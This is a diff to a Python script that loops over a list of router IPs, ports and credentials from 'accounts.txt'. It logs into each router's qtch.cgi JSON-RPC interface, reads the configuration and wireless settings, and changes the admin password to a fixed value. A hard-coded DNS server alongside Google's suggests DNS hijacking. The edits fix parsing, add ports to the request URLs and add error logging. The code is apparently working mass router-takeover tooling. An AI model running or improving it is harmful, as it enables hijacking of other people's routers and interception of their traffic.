@@ -6,7 +6,7 @@ from jsdecode import encrypt_field
 DNS = "79.134.3.101"
 GOOGLE_DNS = "8.8.4.4"
 NEW_PASSWORD = "12qwaszx"
-TIMEOUT = 35
+TIMEOUT = 60
 
 logging.basicConfig(filename='out.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -15,7 +15,7 @@ with open("accounts.txt") as f:
     accounts = f.readlines()
 
 for router in accounts:
-    ip, port, login_and_pass, *other = router.split(" ")
+    ip, port, login_and_pass, *other = router.rstrip().split(" ")
     try:
         login_tmp, password_tmp = login_and_pass.rstrip().split(":")
         password = encrypt_field(login_tmp, password_tmp)
@@ -39,7 +39,7 @@ for router in accounts:
     print(f'Auth: {ip} Used: {login}:{password} TimeOut: {TIMEOUT}')
 
     try:
-        resp = rsession.post(f"http://{ip}/cgi-bin/qtch.cgi", json_data, timeout=TIMEOUT)
+        resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_data, timeout=TIMEOUT)
     except (Exception, requests.Timeout) as e:
         logger.error(e)
         continue
@@ -47,6 +47,10 @@ for router in accounts:
         logger.info(f'status code: {resp.status_code}')
 
         body = resp.json()
+        if body.get('error', False):
+            logger.info(f'Error:: {body.get("error")}')
+            print(f'Error:: {body.get("error")}')
+        # {'jsonrpc': '2.0', 'id': 0, 'error': {'code': -32000, 'message': 'Access denied'}}
         session_id = body.get('result')[0].get('session_id')
         logger.info(f'session_id: {session_id}')
 
@@ -59,7 +63,7 @@ for router in accounts:
 
     json_get_conf = json.dumps(get_conf)
     try:
-        resp = rsession.post(f"http://{ip}/cgi-bin/qtch.cgi", json_get_conf,  timeout=TIMEOUT)
+        resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_get_conf,  timeout=TIMEOUT)
     except (Exception, requests.Timeout) as e:
         logger.error(e)
         continue
@@ -77,7 +81,7 @@ for router in accounts:
 
     json_wlan_conf = json.dumps(wlan)
     try:
-        resp = rsession.post(f"http://{ip}/cgi-bin/qtch.cgi", json_wlan_conf,  timeout=TIMEOUT)
+        resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_wlan_conf,  timeout=TIMEOUT)
     except (Exception, requests.Timeout) as e:
         logger.error(e)
         continue
@@ -100,7 +104,7 @@ for router in accounts:
 
     json_set_pass = json.dumps(set_pass)
     try:
-        resp = rsession.post(f"http://{ip}/cgi-bin/qtch.cgi", json_set_pass,  timeout=TIMEOUT)
+        resp = rsession.post(f"http://{ip}:{port}/cgi-bin/qtch.cgi", json_set_pass,  timeout=TIMEOUT)
     except (Exception, requests.Timeout) as e:
         logger.error(e)
         continue
